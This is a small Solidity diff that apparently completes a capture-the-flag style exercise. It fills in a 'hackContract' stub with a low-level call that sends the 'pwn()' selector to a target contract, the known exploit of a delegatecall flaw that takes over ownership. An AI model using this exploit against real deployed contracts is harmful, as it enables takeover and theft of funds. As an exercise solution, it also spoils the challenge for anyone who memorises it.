@@ -9,7 +9,11 @@ contract AttackingDelegation {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    function hackContract() external returns (bool) {
+        (bool success, ) = contractAddress.call(
+            abi.encodeWithSelector(bytes4(keccak256("pwn()")))
+        );
+
+        return success;
     }
 }
